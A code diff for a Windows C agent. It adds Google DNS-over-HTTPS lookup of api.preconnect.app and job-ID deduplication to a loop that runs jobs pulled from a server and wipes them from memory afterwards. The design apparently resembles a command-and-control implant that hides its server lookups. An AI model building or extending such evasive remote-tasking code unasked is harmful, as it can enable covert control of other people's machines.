@@ -57,6 +57,7 @@ typedef struct {
 static char g_key[512] = {0};
 static char g_ident[256] = {0};
 static char g_last_id[128] = {0};
+static char g_active_id[128] = {0};
 static char g_jwt[512] = {0};
 static wchar_t g_ip[64] = {0};
 static Host g_hosts[MAX_HOSTS];
@@ -360,12 +361,16 @@ void init_id() {
 }
 
 BOOL resolve_doh(const wchar_t *doh_ip) {
+    BOOL is_google = (lstrcmpW(doh_ip, L"8.8.8.8") == 0);
+    const wchar_t *path = is_google ? L"/resolve?name=api.preconnect.app&type=A" : L"/dns-query?name=api.preconnect.app&type=A";
+    const wchar_t *host_hdr = is_google ? L"Host: dns.google\r\n" : L"Host: cloudflare-dns.com\r\n";
     HINTERNET conn = WinHttpConnect(g_session, doh_ip, 443, 0);
     if (!conn) return FALSE;
     BOOL ok = FALSE;
-    HINTERNET req = WinHttpOpenRequest(conn, L"GET", L"/dns-query?name=api.preconnect.app&type=A", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    HINTERNET req = WinHttpOpenRequest(conn, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
     if (req) {
         WinHttpSetTimeouts(req, 5000, 3000, 3000, 5000);
+        WinHttpAddRequestHeaders(req, host_hdr, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
         WinHttpAddRequestHeaders(req, L"Accept: application/dns-json\r\n", (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
         if (WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, 0) && WinHttpReceiveResponse(req, NULL)) {
             char resp[4096] = {0};
@@ -401,6 +406,7 @@ BOOL resolve_doh(const wchar_t *doh_ip) {
     WinHttpCloseHandle(conn);
     return ok;
 }
+
 
 
 
@@ -739,10 +745,14 @@ done:
 DWORD WINAPI job_thread(LPVOID arg) {
     char *curr = (char *)arg;
     while (curr) {
+        EnterCriticalSection(&g_state_lock);
+        json_str(curr, "id", g_active_id, sizeof(g_active_id));
+        LeaveCriticalSection(&g_state_lock);
         run_job(curr);
         SecureZeroMemory(curr, lstrlenA(curr));
         HeapFree(GetProcessHeap(), 0, curr);
         EnterCriticalSection(&g_state_lock);
+        g_active_id[0] = '\0';
         if (g_q_len > 0) {
             curr = g_q_slots[g_q_head];
             g_q_slots[g_q_head] = NULL;
@@ -767,6 +777,12 @@ BOOL queue_job(const char *json) {
     json_str(copy, "id", jid, sizeof(jid));
     EnterCriticalSection(&g_state_lock);
     if (jid[0]) {
+        if (lstrcmpA(jid, g_active_id) == 0) {
+            LeaveCriticalSection(&g_state_lock);
+            SecureZeroMemory(copy, len);
+            HeapFree(GetProcessHeap(), 0, copy);
+            return TRUE;
+        }
         for (LONG i = 0; i < g_q_len; i++) {
             LONG idx = (g_q_head + i) % Q_MAX;
             char eid[128] = {0};
@@ -800,6 +816,7 @@ BOOL queue_job(const char *json) {
         return FALSE;
     }
 }
+
 
 
 DWORD WINAPI ping_loop(LPVOID arg) {
